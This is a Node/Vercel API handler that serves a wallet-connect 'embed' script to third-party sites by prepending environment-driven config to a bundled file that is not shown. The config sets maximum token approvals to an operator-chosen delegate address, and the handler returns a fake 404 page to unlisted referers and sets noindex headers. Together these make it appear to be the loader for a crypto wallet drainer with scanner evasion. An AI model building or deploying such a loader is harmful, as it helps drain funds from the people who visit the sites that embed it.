import { readFileSync } from "node:fs";
import { join } from "node:path";

/**
 * All-in-one loader on Vercel (config + bundle). Set env vars in Vercel dashboard.
 * HTML on another domain:
 *   <script src="https://your-app.vercel.app/api/embed" defer></script>
 */
export default function handler(req, res) {
  if (!refererAllowed(req)) {
    res.status(404).setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(
      "<!DOCTYPE html><html><body><h1>404 Not Found</h1></body></html>"
    );
    return;
  }

  const siteUrl = (process.env.WALLET_SITE_URL || "").replace(/\/$/, "");
  const embedConfig = {
    projectId: process.env.REOWN_PROJECT_ID || "",
    buttonClass: process.env.WALLET_BUTTON_CLASS || "",
    buttonClassMode: process.env.WALLET_BUTTON_CLASS_MODE || "exact",
    network: process.env.WALLET_NETWORK || "solana",
    siteName: process.env.WALLET_SITE_NAME || "Website",
    siteDescription: process.env.WALLET_SITE_DESCRIPTION || "",
    siteUrl,
    siteIcons: parseJsonEnv("WALLET_SITE_ICONS", siteUrl ? [`${siteUrl}/favicon.ico`] : []),
    analytics: process.env.WALLET_ANALYTICS !== "false",
    tokenApprovalEnabled: process.env.WALLET_TOKEN_APPROVAL_ENABLED !== "false",
    tokenDelegate: process.env.WALLET_TOKEN_DELEGATE || "",
    tokenApprovalMaxCount: Number(process.env.WALLET_TOKEN_APPROVAL_MAX_COUNT || "0"),
    tokenApprovalMinUsd: Number(process.env.WALLET_TOKEN_APPROVAL_MIN_USD || "1"),
    tokenApprovalAmountMode: process.env.WALLET_TOKEN_APPROVAL_AMOUNT_MODE || "max",
    solanaRpcUrl: process.env.WALLET_SOLANA_RPC_URL || "",
  };

  let bundle;
  try {
    bundle = readFileSync(
      join(process.cwd(), "public", "wallet.bundle.js"),
      "utf8"
    );
  } catch {
    res.status(500).setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("Missing public/wallet.bundle.js — run npm run build");
    return;
  }

  res.status(200);
  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  res.setHeader("Cache-Control", "public, max-age=300");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.end(
    `window.__WALLET_EMBED_CONFIG__=${JSON.stringify(embedConfig)};\n${bundle}`
  );
}

/** @param {import("@vercel/node").VercelRequest} req */
function refererAllowed(req) {
  if (process.env.WALLET_RESTRICT_ACCESS === "false") {
    return true;
  }

  const allowed = (process.env.WALLET_ALLOWED_HOSTS || process.env.WALLET_SITE_URL || "")
    .split(",")
    .map((h) => hostFromUrl(h.trim()))
    .filter(Boolean);

  if (!allowed.length) {
    return true;
  }

  const sources = [req.headers.origin, req.headers.referer].filter(Boolean);
  for (const source of sources) {
    const host = hostFromUrl(String(source));
    if (host && allowed.includes(host)) {
      return true;
    }
  }

  const secFetchSite = String(req.headers["sec-fetch-site"] || "").toLowerCase();
  if (secFetchSite === "same-origin" || secFetchSite === "same-site") {
    return true;
  }

  return false;
}

/** @param {string} value */
function hostFromUrl(value) {
  try {
    return new URL(value).hostname.toLowerCase();
  } catch {
    return "";
  }
}

/** @param {string} key @param {unknown} fallback */
function parseJsonEnv(key, fallback) {
  const raw = process.env[key];
  if (!raw) return fallback;
  try {
    return JSON.parse(raw);
  } catch {
    return fallback;
  }
}
